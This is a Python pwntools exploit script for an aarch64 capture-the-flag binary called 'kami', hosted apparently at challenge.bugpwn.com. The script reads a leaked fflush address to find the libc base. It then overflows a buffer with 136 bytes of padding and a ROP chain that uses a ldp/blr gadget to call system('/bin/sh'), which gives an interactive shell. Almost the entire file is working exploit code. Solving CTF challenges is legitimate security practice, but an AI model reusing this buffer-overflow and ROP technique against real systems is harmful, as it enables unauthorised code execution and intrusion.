#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./kami_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-aarch64.so.1")

context.binary = exe

REMOTE_NC_CMD    = "nc challenge.bugpwn.com 1000"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.recvuntil(b"at ")
    libc.address = int(r.recvline(), 16) - libc.sym.fflush
    log.info(f"LIBC @ {hex(libc.address)}")
    rop = ROP(libc)

    rop.raw(b"A"*136)

    #0x0000000000051cd0: ldp x2, x0, [sp]; ldr x1, [sp, #0x20]; blr x2; 

    rop.raw(0x0000000000051cd0+libc.address)
    rop.raw(b"A"*16)
    rop.raw(libc.sym.system)
    rop.raw(libc.binsh())

    r.sendline(rop.chain())

    r.interactive()

if __name__ == "__main__":
    main()